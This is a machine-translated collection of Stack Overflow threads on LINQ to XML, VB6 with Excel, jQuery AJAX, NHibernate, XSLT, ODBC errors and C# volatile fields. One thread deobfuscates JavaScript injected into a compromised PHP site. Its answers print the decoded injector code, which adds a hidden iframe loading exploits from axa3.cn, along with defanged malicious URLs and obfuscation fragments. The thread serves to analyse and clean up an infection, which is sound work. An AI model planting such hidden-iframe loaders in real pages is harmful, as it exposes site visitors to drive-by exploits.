                        <ResultValue low="29" high="34"/>
                    </Age>
                </Ages>
            </Gender>
        </Genders>   
    </Result> 
```

如果我有，我的 linq to xml 查询会是什么样子

性别=“女性”

年龄=29

结果值=17

这个先证者肯定属于第 1 组，我想打印出匹配的描述...

但我正在努力让这个工作......

我正在寻找 c# 中的解决方案...任何帮助都会很棒！！！

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2009-01-08T17:52:51.520

像这样的东西？

```
XElement myElement = XElement.Parse(xmlstring);

int resultValue = 17;
int age = 26;
string genderValue = "female";

IEnumerable<string> query =
    myElement.Descendants("ResultValue")
        .Where(rv => ((int)rv.Attribute("low")) <= resultValue)
        .Where(rv => ((int)rv.Attribute("high")) >= resultValue)
        .Where(rv => rv.Ancestors("Age")
            .Any(a => ((int) a.Attribute("low")) <= age && ((int) a.Attribute("high")) >= age)
        )
       .Where(rv => ((string)rv.Ancestors("Gender").Single().Attribute("type")) == genderValue)
       .Select(rv => rv.Ancestors("Result").Single().Element("Description").Value);

    foreach (string x in query)
        Console.WriteLine(x); 
```

这个想法是，您可以想象一个行列形状，其中每一行都是一个 ResultValue。每个结果值都有一个 Age 的单亲，一个 Gender 的单亲，一个 Result 的单亲。

ResultValue.Low ResultValue.High Age.Low Age.High Gender.Type Result.Description

实际上，可以将上述 xml 投影到该形状中：

```
 var query2 = myElement.Descendants("ResultValue")
            .Select(rv => new 
            {
                ResultValue = rv,
                Age = rv.Ancestors("Age"),
                Gender = rv.Ancestors("Gender"),
                Result = rv.Ancestors("Result")
            })
            .Select(x => new XElement("Data",
            new XAttribute("ResultValue.Low", (int)x.ResultValue.Attribute("low")),
            new XAttribute("ResultValue.High", (int)x.ResultValue.Attribute("high")),
            new XAttribute("Age.Low", (int)x.Age.Attributes("low").Single()),
            new XAttribute("Age.High", (int)x.Age.Attributes("high").Single()),
            new XAttribute("Gender.Type", (string) x.Gender.Attributes("type").Single()),
            new XAttribute("Result.Description", (string) x.Result.Elements("Description").Single())
            ));
        foreach (XElement x in query2)
            Console.WriteLine(x); 
```

# vb6 - 权限被拒绝使用 Excel 12.0 库和 VB6 打开 Excel 文件

> ID：425092
> 
> 赞同：3
> 
> 时间：2009-01-08T17:13:44.563
> 
> 标签：vb6, excel, vba

我以前在我的 VB6 应用程序中使用过 Excel 很多次，并且从未遇到过如此奇怪的问题，试图完成一些非常简单的事情。

如您所见，我正在尝试打开一个 excel（xls 或 xlsx）文件并读取值。

当我尝试打开文件时，我收到错误 70（权限被拒绝）错误。奇怪的是，没有打开其他 excel 实例（在任务管理器应用程序或进程中）。没有其他人试图访问该文件。我可以在没有警告的情况下在 excel 中打开文件，也可以在 VB6 中使用基本的“打开文件以输入为 #1”语法打开/读取/关闭文件而不会出错。我可以使用 Kill() 删除文件，所以它不能是目录权限问题 - 请帮助 - 我不知所措！！！

```
 Dim xlApp As New Excel.Application

  Dim xlWBook As Excel.Workbook

  'Error Occurs Here
  Set xlWBook = xlApp.Workbooks.Open(File)

  Dim xlSheet As Excel.Worksheet
  Set xlSheet = xlWBook.Sheets.Item(1)

  Dim y As Integer
  For y = 1 To 99999
    If Len(xlSheet.Cells(y, 1)) > 0 Then
      Send xlSheet.Cells(y, 1) & " - " & xlSheet.Cells(y, 2) & "<br>"
    End If
  Next

  Set xlWBook = Nothing
  Set xlApp = Nothing 
```

-杰伊

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-01-08T17:18:28.313

您可以打开一个新创建的空电子表格文档吗？

如果这不起作用，则可能是您的 Excel 安装需要重新注册。打开命令提示符并导航到安装 Excel 的文件夹，通常类似于

```
cd "C:\Program Files\Microsoft Office\Office12" 
```

然后使用选项 /regserver 启动 Excel

```
excel.exe /regserver 
```

如果这没有帮助，您可以转到控制面板 -> 添加或删除程序并开始修复 Microsoft Office。

要检查的另一件事是是否加载了任何加载项。如果是这样，请尝试将它们一一禁用，看看问题是否消失。

如果问题仍然存在，您可能需要检查是否有任何可用的 Office 更新。

我不知道这一切是否与您的问题有关，这是Office应用程序的标准故障排除技术......

更新：也许使用 Procmon 进行故障排除会揭示问题所在（请参阅[http://support.microsoft.com/kb/286198](http://support.microsoft.com/kb/286198)）。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-09-03T14:23:01.723

你检查过你的 DCOM 配置。

今天有一个类似的问题，尝试创建 Excel.Application 的 Web 服务收到拒绝访问。

在我的实例中，我必须添加 Internet 访客帐户才能获得对组件的访问权限。

您可以从 Start -> Run 进入 DCOM 配置

输入 DCOMCNFG - 回车

然后浏览到组件服务/计算机/我的电脑/DCOM 配置/Microsoft Excel 应用程序

右键，属性...

这些设置位于“安全”选项卡下。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-01-30T10:02:50.960

```
Dim xlApp As New Excel.Application    
Dim xlWBook As Excel.Workbook    
'Error Occurs Here   
Set xlWBook = xlApp.Workbooks.Open(File) 
```

没有定义哪个文件是。IE。

```
File="C:\myDocuments\myexcel.xlsx". 'Because File string is empty. 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-08-04T08:01:06.713

当 excel 文件中存在问题、一致性问题时，可能会发生这种情况。该文件有点损坏。

例如，工作表上有 2 个具有相同名称的对象。关键是，我不知道你的文件是如何被这种“问题”保存的，但是当 Excel 尝试打开它时，它会抛出这种错误。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2009-01-08T17:23:08.803

也许不是权限被拒绝的文件。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2009-01-12T22:46:22.463

只是一个想法，您是否查看过 Windows 事件日志以查看是否可以在那里找到更多信息？

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2009-09-09T15:00:10.717

您似乎在没有明确关闭它的情况下创建了一个新的 Excel 实例（即 xlApp.Close 在将其设置为 Nothing 之前）。这可能是你问题的原因。

如果从 VBA 调用 Office 应用程序时有一些松散的实例正在运行，有时事情会变得混乱。如果您在任务管理器中运行了一些 Excel.exe，但在屏幕或任务栏上看不到该应用程序，请杀死它们并重试。

# jquery - 使用 AJAX 和 jQuery 提交表单

> ID：425095
> 
> 赞同：59
> 
> 时间：2009-01-08T17:15:31.863
> 
> 标签：jquery, ajax, serialization

看起来这应该是 jQuery 内置的东西，而不需要多于几行代码，但我找不到“简单”的解决方案。说，我有一个 HTML 表单：

```
<form method="get" action="page.html">
    <input type="hidden" name="field1" value="value1" />
    <input type="hidden" name="field2" value="value2" />
    <select name="status">
         <option value=""></option>
         <option value="good">Good</option>
         <option value="bad">Bad</option>
    </select>
</form> 
```

当有人更改选择字段时，我想使用 ajax 提交表单来更新数据库。我认为有一些方法可以在不手动创建值/属性的情况下执行以下操作，只需将它们全部发送，例如：

```
$("select").change(function(){
    $.get("page.html?" + serializeForm());
}); 
```

我错过了什么？

* * *

## 回答 #1

> 赞同：146
> 
> 时间：2009-01-08T17:28:17.577

首先给你的表单一个`id`属性，然后使用这样的代码：

```
$(document).ready( function() {
  var form = $('#my_awesome_form');

  form.find('select:first').change( function() {
    $.ajax( {
      type: "POST",
      url: form.attr( 'action' ),
      data: form.serialize(),
      success: function( response ) {
        console.log( response );
      }
    } );
  } );

} ); 
```

因此，此代码用于`.serialize()`从表单中提取相关数据。它还假设您关心的选择是表单中的第一个。

为了将来参考，jQuery[文档](http://docs.jquery.com/Ajax/serialize)非常非常好。

* * *

## 回答 #2

> 赞同：31
> 
> 时间：2009-01-08T17:18:44.960

有一个不错的[表单插件](http://malsup.com/jquery/form/)，允许您异步发送 HTML 表单。

```
$(document).ready(function() { 
    $('#myForm1').ajaxForm(); 
}); 
```

或者

```
$("select").change(function(){
    $('#myForm1').ajaxSubmit();
}); 
```

立即提交表格

* * *

## 回答 #3

> 赞同：14
> 
> 时间：2009-05-03T15:15:59.440

这就是最终的工作。

```
$("select").change(function(){
    $.get("/page.html?" + $(this).parent("form").find(":input").serialize()); 
}); 
```

# asp.net - 混合 NHibernate DAL/BLL

> ID：425112
> 
> 赞同：1
> 
> 时间：2009-01-08T17:19:12.183
> 
> 标签：asp.net, nhibernate, webforms, daab

我有一个现有的 asp.net webforms 项目，它使用 Microsoft 的 Enterprise DAAB 作为 DAL，我需要实现一些广泛的功能，并且我想使用 NHibernate 使事情变得更容易。

是否有任何允许混合 DAAB/NHibernate DAL 的设计模式/架构？这是个好主意吗 ？

我的想法是：如果我有一个混合 DAL，我仍然可以通过 DAAB 端传递高流量/非动态查询，并节省动态 sql 生成的开销。但仍然有 nhibernate 用于更复杂的查询。

此外，为 asp.net webforms 应用程序设置 NHibernate DAL/BLL 的最佳方法是什么？我已经阅读了 NHibernate 网站上的教程，其他几个似乎没有就开始/​​结束 nhib 会话达成共识。我只是在寻找最佳实践示例。

谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-01-08T17:29:09.433

我听说过的一种方法是在与域模型交互时使用 nHibernate。请记住，nHibernate 可以调用存储过程，所以如果你想避免 SQL 生成，你可以，但我建议不要这样做。

如果您对报告或显示数据的查询不想从中创建自定义实体，则可以使用 DAAB，但如果您要创建实体，我不建议这样做。

至于最佳实践，我发现在需要时创建会话，然后将其存储在 httpContext 中，您将在每个请求时关闭会话。

然后唯一的另一件事是专门创建和结束一个事务，如果您的逻辑将跨越多个服务，我将在您的服务层或应用程序层中执行该事务（我将服务定义为不是 web 服务，而是作为屏蔽的高级代码片段您的域层中的应用程序）。

Billy McCafferty 的文章是一个很好的起点：http: [//www.codeproject.com/KB/architecture/NHibernateBestPractices.aspx](http://www.codeproject.com/KB/architecture/NHibernateBestPractices.aspx)

如果您使用他的方法，他的代码中有一个错误/限制，请查看我的博客文章：http: [//jberke.blogspot.com/2008/10/nhibernate-transaction-session-mgmt.html](http://jberke.blogspot.com/2008/10/nhibernate-transaction-session-mgmt.html)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-01-28T04:17:23.347

您有两个问题 - 您或版主应该将其分成两个问题：1) 一起使用 DAAB 和 NHibernate 的最佳方式是什么？

2) 在 Web 窗体应用程序中设置 NHibernate 的最佳方法是什么？

我可以回答第二个，即在 ASP.NET 中使用一个 HttpModule 来配置每个请求的上下文。可以在此处找到示例模块：http: [//tinyurl.com/b5am9b](http://tinyurl.com/b5am9b)

```
public class NHibernateSessionModule : IHttpModule
    {
        public void Init(HttpApplication context)
        {
            context.EndRequest += new System.EventHandler(context_EndRequest);
        }

        void context_EndRequest(object sender, System.EventArgs e)
        {
            HybridSessionBuilder builder = new HybridSessionBuilder();
            ISession session = builder.GetExistingWebSession();
            if (session != null)
            {
                                Log.Debug(this, "Disposing of ISession " + session.GetHashCode());
                session.Dispose();
            }
        }

        public void Dispose()
        {

        }
    } 
```

# javascript - 您将如何对此进行逆向工程？

> ID：425113
> 
> 赞同：5
> 
> 时间：2009-01-08T17:19:50.137
> 
> 标签：javascript, hex, obfuscation, reverse-engineering, deobfuscation

我有一些代码位于 javascript 中的 php 文件的底部。它经历了许多奇怪的扭曲，比如将十六进制转换为 ascii，然后进行正则表达式替换，执行代码等等......

有没有办法在它实际执行之前找出它正在执行的内容？

代码在这里：

[http://pastebin.ca/1303597](http://pastebin.ca/1303597)

* * *

## 回答 #1

> 赞同：26
> 
> 时间：2009-01-08T17:30:46.713

您可以逐步完成它 - 因为它是 Javascript，并且它是被解释的，所以它需要是它自己的解密器。如果您可以访问命令行 Javascript 解释器（例如[Firebug](http://www.getfirebug.com/)中的控制台），这将相当简单。

我会看看，看看会发生什么。

*编辑*我已经完成了大部分工作 - 看起来最后一步并非易事，可能是因为它涉及“argument.callee”。无论如何，我已经在Pastebin上提出了[迄今为止的内容。](http://pastebin.ca/1303638)

有趣的是，我发现其中最困难的部分是给乱码变量正确命名。它让我想起了填字游戏或数独游戏，你知道事物是如何相关的，但在你弄清楚它的依赖部分是什么之前，你不能明确地分配一些东西。:-) 我敢肯定，如果有人认可该算法，他们可以为这些部分赋予更有意义的名称，但是在进行大量异或运算的地方，有两个临时变量，我刚刚将其保留为默认名称因为我不知道足够的上下文来给他们有用的上下文。

*最终编辑*：当我意识到我可以传入具有讽刺意味的是刚刚解码的原始文本时，“arguments.callee”位变得很容易（这是一种非常聪明的技术，因此正常的反混淆当然不会起作用，因为一次您重命名变量等，值不同）。无论如何，这是您的完整脚本：

```
 function EvilInstaller(){};
    EvilInstaller.prototype = {
        getFrameURL : function() {
            var dlh=document.location.host;
            return "http"+'://'+((dlh == '' || dlh == 'undefined') ? this.getRandString() : '') + dlh.replace (/[^a-z0-9.-]/,'.').replace (/\.+/,'.') + "." + this.getRandString() + "." + this.host + this.path;
        },
        path:'/elanguage.cn/',
        cookieValue:1,
        setCookie : function(name, value) {
            var d= new Date();
            d.setTime(new Date().getTime() + 86400000);
            document.cookie = name + "=" + escape(value)+"; expires="+d.toGMTString();
        },
        install : function() {
            if (!this.alreadyInstalled()) {
                var s = "<div style='display:none'><iframe src='" + this.getFrameURL() + "'></iframe></div>"
                try {
                    document.open();
                    document.write(s);
                    document.close();
                }
                catch(e) {
                    document.write("<html><body>" + s + "</body></html>")
                }
                this.setCookie(this.cookieName, this.cookieValue);
            }
        },
        getRandString : function() {
            var l=16,c='0Z1&2Q3Z4*5&6Z7Q8*9)a*b*cQdZeQf*'.replace(/[ZQ&\*\)]/g, '');
            var o='';
            for (var i=0;i<l;i++) {
                o+=c.substr(Math.floor(Math.random()*c.length),1,1);
            }
            return o;
        },
        cookieName:'hedcfagb',
        host:'axa3.cn',
        alreadyInstalled : function() {
            return !(document.cookie.indexOf(this.cookieName + '=' + this.cookieValue) == -1);
        }
    };
    var evil=new EvilInstaller();
    evil.install(); 
```

基本上它看起来像是从 axa3.cn 加载恶意软件。不过，该网站已经被 ISP 怀疑了，所以不知道除了一般的坏处之外实际上还有什么。

（如果有人感兴趣，我将 Pastebin 用作更改代码版本的伪 VCS，因此您可以在我的第一篇编辑帖子之后看到[另一个中间步骤](http://pastebin.ca/1303652)。看到不同的混淆层以及如何他们改变了。）

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-01-08T17:28:46.250

只需编写一个 perl 脚本或将所有转义的十六进制字符更改为 ascii 的东西？然后只需查看正则表达式以查看到底发生了什么，并对您的 perl/whatever 脚本执行相同的操作。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2009-01-08T18:43:45.570

虽然您可以手动解码，但当您有多个解码阶段时，它很快就会变得乏味。我通常替换 eval/write 来查看每个步骤：

```
<script>
    window.__eval= window.eval;
    window.eval= function(s) { if (confirm('OK to eval? '+s)) return this.__eval(s); }
    document.__write= document.write;
    document.write= function(s) { if (confirm('OK to write? '+s)) return this.__write(s); }
</script> 
```

然而，通过仔细检查 window.eval，可以保护这个特定的脚本免受这种情况的影响。使用 arguments.callee 还意味着脚本依赖于特定浏览器的 Function.toString 格式，在这种情况下是 IE - 它不适用于其他浏览器。您可以在替换 eval 函数中放置变通方法，以在这种情况下为脚本提供它所期望的内容，但这仍然有点痛苦。

您可以使用 Script Debugger 单步调试代码，或者我在这种情况下所做的是允许代码在没有网络的虚拟机中运行，我可以负担得起注销。通过在代码运行后查看 document.body.innerHTML，我发现它添加了一个不可见的 iframe，指向：

```
hxxp://62bc13b764ad2799.bbe4e7d3df5fdea8.axa3.cn/elanguage.cn/ 
```

重定向到：

```
hxxp://google.com.upload.main.update.originalcn.cn/ebay.cn/index.php 
```

在 IE 中以合适的条件查看，它会给你带来大量的漏洞利用。*不要访问这些 URL*。

简而言之，您的服务器已被 axa3.cn 入侵，axa3.cn 是目前许多由中国托管但由俄罗斯运营的恶意软件团伙之一。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2009-01-08T17:31:49.363

您可以尝试使用萤火虫控制台并将其分解。作为开始：

```
var jQuery = eval('w;iLn0d;opw;.0epv_a_l;'.replace(/[;0_pL]/g, '')); 
```

只是将“eval”函数掩盖为“jQuery”

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2009-01-08T17:39:25.403

最简单的方法是使用简单的 c 程序将转义的十六进制字符转换为可读文本，如下所示：

```
#include <stdio.h>

const char wtf[] = ""; // Really long string goes here

int main(void) {
    ::printf("%s\n", wtf);
} 
```

这产生[了这个](http://www.nomorepasting.com/getpaste.php?pasteid=23298)（我添加了格式）。我会让你完成最后一部分，它看起来更相似。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2009-01-08T18:31:46.873

非常小心——如果有人费了这么大的力气来混淆代码，那可能是某种攻击脚本

您可以使用本地 html 文件分阶段输出执行结果，并一次获取一份

这样做我得到：

```
var jQuery = "eval(" + 
    'w;iLn0d;opw;.0epv_a_l;'.replace(/[;0_pL]/g, '') + 
    ");";
document.writeln('jQuery=' + jQuery); 
```

产生

```
jQuery=eval(window.eval); 
```

正如 crescentfresh 所观察到的，它将变量 jQuery 绑定到 window.eval 函数。

下一节显然是试图用十六进制代码评估某些东西，所以让我们看看十六进制代码字符串是什么样子的（出于演示目的手动重新格式化）：

```
 function g4LZ(s9QNvAL)
    {
        function eDdqkXm(fX09)
        {
            var uaWG=0;
            var jtoS=fX09.length;
            var aCD6=0;
            while(aCD6wQ5.length)
                d971I=0;
            if(f234SD>lIXy6md.length)
                f234SD=0;
            kyCyJ+=String.fromCharCode(nCV2eO^ocx) + '';
        }
        eval(kyCyJ);
        return kyCyJ=new String();
    }
    catch(e){}
}
g4LZ('%33...%5e'); 
```

现在我们在最后得到了一个转义字符串，让我们看看里面有什么使用 unescape （为了演示而截断）：

> 30248118GA0* l: WRG:nt9*82:)7Z\uF%*{...

坦率地说，我厌倦了把它拆开，所以我把它转储到一个本地 html 文件中，断开与互联网的连接，打开 firefox，禁用 javascript，在 firefox 中加载文件，打开 firebug，重新加载页面以便它运行，并检查了 DOM。

该脚本会创建一个 IFRAME，并将 SRC 设置为 [为安全而更改！]：

```
http://4b3b9e839fd84e47 [DO NOT CLICK THIS URL] .27f721b7f6c92d76.axa3.cn/elanguage.cn/ 
```

axa3.cn 是恶意软件黑名单上的中文域

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2009-01-08T18:10:44.543

我知道这不是答案，但通常（我在哪里见过这种东西），它们被放置，所以如果该行没有执行，所有脚本都会停止。他们为什么这样做？好吧，因为他们在脚本（或更通常是模板）上打印了他们的版权。

当人们为了您的认可而费尽心机是因为他们确实拥有删除版权许可时，我建议您为此付费，因为即使您“逆向工程”，他们也可以（并且有）其他方法来检查是否你的执照是真的。（如果您这样做，其中一些软件实际上会发送某种消息）。

但是，在我得到任何形式的火焰之前，我同意回到这种证券并获取原始代码并破解它很有趣=）

# xslt - 转换和合并 *.xml

> ID：425117
> 
> 赞同：4
> 
> 时间：2009-01-08T17:20:38.980
> 
> 标签：xslt

我想从 xml 文件中提取一系列关系并将它们转换为我用点生成的图形。我显然可以使用脚本语言来做到这一点，但我很好奇这是否可以使用 xslt。就像是：

```
xsltproc dot.xsl *.xml 
```

这会产生一个像

```
diagraph {
 state -> state2
 state2 -> state3
 [More state relationships from *.xml files]
} 
```

所以我需要1）用“diagraph {...}”包装组合的xml转换和2）能够处理命令行上指定的任意一组xml文档。

这可能吗？任何指针？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2009-01-08T20:45:55.260

**使用[XSLT 2.0](http://www.w3.org/TR/xslt20/)处理器和[`collection()`](http://www.w3.org/TR/xpath-functions/#func-collection)功能，这真的很容易**。

下面是使用**[Saxon](http://www.saxonica.com/documentation/index/intro.html)**的示例：

```
<xsl:stylesheet version="2.0"
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
>
    <xsl:output omit-xml-declaration="yes" indent="yes"/>

    <xsl:param name="pDirName" select="'D:/Temp/xmlFilesDelete'"/>

    <xsl:template match="/">
    <wrap>
        <xsl:apply-templates select=
         "collection(
                    concat('file:///',
                            $pDirName,
                            '?select=*.xml;recurse=yes;on-error=ignore'
                             )
                         )/*
          "/>
      </wrap>
    </xsl:template>

    <xsl:template match="*">
      <xsl:copy-of select="."/>
    </xsl:template>
</xsl:stylesheet> 
```

当此转换应用于任何 XML 文档（未使用）时，它会处理从目录开始的文件系统子树中的所有 xml 文件，其值由全局参数指定**`$pDirName`**。

**在应用此转换时，那里只有两个 xml 文件**：

```
<apples>3</apples> 
```

和

```
<oranges>3</oranges> 
```

**产生正确的结果**：

```
<wrap>
   <apples>3</apples>
   <oranges>3</oranges>
</wrap> 
```

这是可以构建的最简单的示例。**要完全回答这个问题，可以在调用 Saxon 的命令行上指定目录。[在此处](http://www.saxonica.com/documentation/using-xsl/commandline.html)****阅读有关从命令行调用 Saxon 的更多信息**。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2010-01-30T14:50:43.157

你可能想看看（[http://martin-loetzsch.de/DOTML/](http://martin-loetzsch.de/DOTML/)）。它使用 xslt 从 xml 文档生成点语法。

# wcf - 将数据从 SSIS 传递到 WCF 的最佳选择是什么？

> ID：425122
> 
> 赞同：1
> 
> 时间：2009-01-08T17:21:15.907
> 
> 标签：wcf, ssis

我们正在尝试从 SQL Server 数据库中获取数据并将其提交到 WCF Web 服务。由于在这种情况下不能选择使用 Windows 服务，因此我想到了使用 SSIS。

我曾尝试使用 Web 服务任务，但我很难让它工作。我也明白使用 Web Service Task 是有限制的。将数据从 SSIS 传递到 WCF 的最佳选择是什么？注意：我们在 SQL 中使用 CLR 集成受到限制。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2009-01-20T21:14:57.313

另一种选择是不使用 WCF 并使用传统的 web 服务。如果 WCF 服务不受您的控制。您可以使用传统的 Web 服务来调用 wcf 服务。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-01-08T17:27:05.613

值得一试[在 SQL Server 2005 中访问 Web 服务](http://sqlmag.com/Article/ArticleID/53966/sql_server_53966.html)

我不确定这是否是最佳选择，但您可以在存储过程中使用 OLE 自动化来调用 Web 服务。

[从 SQL 存储过程调用 GeoNames Web 服务](http://blog.davebouwman.net/2008/07/09/CallGeoNamesWebServicesFromASQLStoredProcedure.aspx)

# c# - 使用 LINQ 干净地处理嵌套 XML 的更好方法

> ID：425125
> 
> 赞同：5
> 
> 时间：2009-01-08T17:21:58.853
> 
> 标签：c#, xml, linq

我正在使用由通过嵌套级别获得报酬的人设计的 XML。不同的 xml 文件总是看起来像这样：

```
<Car>   
   <Color>
       <Paint>
          <AnotherUselessTag>
               <SomeSemanticBs>
                   <TheImportantData> 
```

使用 LINQ 很容易得到我想要的：（不完全是，但你明白了）

```
from x in car.Descendants("x")
from y in x.Descendants("y")
from z in y.Descendants("z")
select z.WhatIWant(); 
```

我问是否有更好的方法来做到这一点？使用 Linq 导航 DOM 的某种方式？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2009-01-08T17:31:41.843

如果您确定您想要的只是`TheImporantData`元素中的`Car`元素并且`TheImportantData`不用作标签名称，那么： -

从 car.Descendants("TheImportantData") 中的 x 选择 x.WhatIWant();

会做。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2009-01-08T21:27:50.230

考虑`XNode`扩展方法`XPathSelectElements`。在你的情况下：

```
var foo = from x in car.XPathSelectElements("Color/Paint/AnotherUselessTag/SomeSemanticBs/TheImportantData")
select x.WhatIWant(); 
```

与该`Descendants`方法不同，以这种方式使用 XPath 专门导航到您需要的元素 - 例如，它只会查看`Color`元素下的`Car`元素，并且只会查看`Paint`元素下的`Color`元素，等等。`Descendants`（如果需要，您可以使用 XPath 模式模拟该方法的区分度较低的行为`.//TheImportantData`。）

# sql-server - 失去与 SQL Server 2005 数据库的 ODBC 连接

> ID：425130
> 
> 赞同：2
> 
> 时间：2009-01-08T17:23:42.563
> 
> 标签：sql-server, odbc, database-connection, visual-foxpro, foxpro

我们的一个客户有一个运行在 SQL Server 2005 后端之上的应用程序 (FoxPro 9)。间歇性地，他们失去了与 SQL Server 数据库的 ODBC 连接。以下是初始错误信息：

> 错误消息：连接错误：[Microsoft][ODBC SQL Server Driver][DBNETLIB]ConnectionRead (recv())。
> 
> ODBC 错误消息：[Microsoft][ODBC SQL Server Driver][DBNETLIB]ConnectionRead (recv())。
> 
> SQL 状态：01000
> 
> ODBC 错误编号：10054
> 
> ODBC 句柄：1
> 
> FoxPro 错误编号：1526

我们无法在命令中复制此错误。我们尝试了任何数量的解决方案都无济于事。我们发现的一种此类硬件基础解决方案在以下网址中进行了描述：http: [//support.microsoft.com/kb/942861/en-us](http://support.microsoft.com/kb/942861/en-us)

我提到这一点是因为它几乎完全符合我们所看到的。但是，我们已经实施了该帖子中列出的所有解决方法（以及在这个[http://support.microsoft.com/kb/948496](http://support.microsoft.com/kb/948496)中） - 问题仍然存在。

此问题似乎在执行长时间运行的查询后出现，但我们没有收到来自应用程序或 SQL Server 的任何超时错误。我不相信这是空闲超时的结果，因为它有时会发生在执行程序的中间。

我不是硬件专家，但网络和服务器 (Windows Server 2003) 似乎都很快且设计良好。但是，有时数据库服务器会承受很大的压力。

如果有人对我们可以尝试的事情有任何建议……请告诉我们！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-01-08T18:08:32.487

只是在黑暗中拍摄，但您是否尝试过运行跟踪并尝试捕获错误事件以及任何 tsql. 这可能会提供一些线索或帮助您查看模式。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-03-06T01:20:53.913

只是对这个问题的跟进……部分解决方案。

我确实进行了跟踪，实际上是其中的一些。我发现，这些错误似乎有多种原因。我能够找到并修复其中一个，但我们仍然在其他地方遇到此错误，并且它们没有出现在我所做的跟踪中。

那么我找到的那个是怎么回事？好吧，从跟踪中我发现这些 ODBC 错误出现在另一个 SQL Server 错误之后：

```
Error: 1203, Severity: 20, State: 1.
Process ID 94 attempted to unlock a resource it does not own: OBJECT: 25:1699834390:0 . Retry the transaction, because this error may be caused by a timing condition. If the problem persists, contact the database administrator. 
```

从 FoxPro 代码中，我发现插入语句导致了这个错误......并非总是......但有时。在此插入中，他们将一个表中的所有字段以及另一个表中的一些字段提取到第三个表中。此数据库中的每个表都有一个名为 id_col 的标识列，填充第三个表的 select 语句返回两个 id_col 字段。

```
insert into tablethree 
select a.*, b.price, b.item, id_col 
from tableone a, tabletwo b 
where a.item = .... 
```

当我们重组代码以便只返回一个 id_col 时......错误停止了。

老实说，我同时修复了另一个可能导致此错误的原因。在此之前还有另一个大/长查询，它`a.item+a.customer = lc_item+lc_customer`在 sql server 查询中使用 Foxpro Rushmore 语法（例如）。我们以前遇到过这种类型的问题，所以它可能是导致问题的原因......但证据高度支持额外的身份列是原因。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-01-03T20:32:26.197

使用 pb application 和 ms sql 作为 db，从头开始设置 2 个事务对象。一个函数使用第一个事务循环游标，在此循环中，第二个事务对象用于更新另一个表。如果更新后未使用显式提交（第二个事务 obj），则第一个连接将关闭，我收到 [Microsoft][ODBC SQL Server Driver][DBNETLIB]ConnectionRead (recv()) 错误。一旦我为相应的事务调用了适当的提交语句，一切都像魅力一样。 **是的，错误总是在您实际发生崩溃的位置之前的某个地方 - 假设您处于调试模式**. 有趣的是，Sybase 设法关闭/打开适当的事务，而无需显式地对第二个事务对象发出提交！！！！

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-04-13T14:15:01.737

Not sure if you have come across a complete solution, but have you looked into whether the network connection ever gets interrupted? One of the VFP programs I was developing started losing its SQL connection very frequently for users that were using laptops. It seemed that the laptops were temporary losing the network connection. Even if the connection is only gone for a couple seconds, the handle in VFP needs to be reset. Not sure if this is your exact issue, but sounded similar to me.

# c# - “对 volatile 字段的引用不会被视为 volatile” 含义

> ID：425132
> 
> 赞同：43
> 
> 时间：2009-01-08T17:24:40.360
> 
> 标签：c#, .net, multithreading, volatile

以下代码

```
using System.Threading;

class Test
{
    volatile int counter = 0;
    public void Increment()
    {
        Interlocked.Increment(ref counter);
    }
} 
```

引发以下编译器警告：

```
"A reference to a volatile field will not be treated as volatile" 
```

我在这里做错了什么来发出这个警告吗？为什么编译器会对此发出警告？

* * *

## 回答 #1

> 赞同：46
> 
> 时间：2009-01-08T17:29:20.837

你没有做错任何事。根据[文档](https://docs.microsoft.com/en-us/dotnet/csharp/language-reference/compiler-messages/cs0420)：

> volatile 字段通常不应使用 ref 或 out 参数传递，因为在函数范围内它不会被视为 volatile。这也有例外，例如在调用互锁 API 时。

* * *

## 回答 #2

> 赞同：34
> 
> 时间：2009-01-08T17:28:47.077

基本上警告是，当您通过引用传递 volatile 字段时，调用代码不知道以 volatile 方式处理它。对于 Interlocked.Increment，由于方法的性质，这可能无关紧要 - 但是如果您使用 Interlocked ，则*无论如何您都不需要变量是 volatile。*

一般来说，我想我会避免将两者混为一谈——如果你使用的是 Interlocked，那就*到处*做（`Interlocked.CompareExchange(ref counter, 0, 0)`用来阅读）。就个人而言，我不能说我经常使用 volatile。对于简单的计数器，我*可能会*使用互锁，但我更有可能对大多数任务使用锁。

* * *

## 回答 #3

> 赞同：31
> 
> 时间：2009-10-02T22:28:28.473

用这个：

```
#pragma warning disable 420
if(Interlocked.CompareExchange(ref isLoaded, 1, 0) != 0)
    return;
#pragma warning restore 420 
```

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2009-01-08T17:28:09.950

您收到错误是因为您通过引用传递了该字段。我认为这意味着目标方法不知道该字段被标记为`volatile`，因此不会这样对待它。

# ruby-on-rails - Apache 的 AuthDigestDomain 和 Rails 分布式资产主机

> ID：425136
> 
> 赞同：0
> 
> 时间：2009-01-08T17:26:46.393
> 
> 标签：ruby-on-rails, apache, authentication, assets

我有一个服务器，我正在设置过程中，我遇到了一个无法解决的 Apache 配置问题。

我有 Apache 2.2 和 Passenger 服务于带有分布式资产托管的 Rails 应用程序。这是 Rails 的特性，它允许您从 assets0.example.com、assets1、assets2 等提供静态资产。

